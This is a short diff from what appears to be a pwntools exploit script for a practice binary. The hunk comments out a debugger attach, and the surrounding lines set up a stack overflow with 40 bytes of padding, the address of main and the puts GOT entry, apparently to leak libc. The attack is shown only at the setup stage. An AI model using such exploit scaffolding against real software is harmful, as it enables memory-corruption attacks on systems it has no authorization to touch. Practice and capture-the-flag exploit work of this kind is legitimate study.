@@ -4,7 +4,7 @@ p = process("./out")
 context.binary = "./out"
 binary = ELF('./out')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-gdb.attach(p)
+#gdb.attach(p)
 JUNK = b"A" * 40
 main = p64(0x401156)
 got_puts = p64(0x404018)
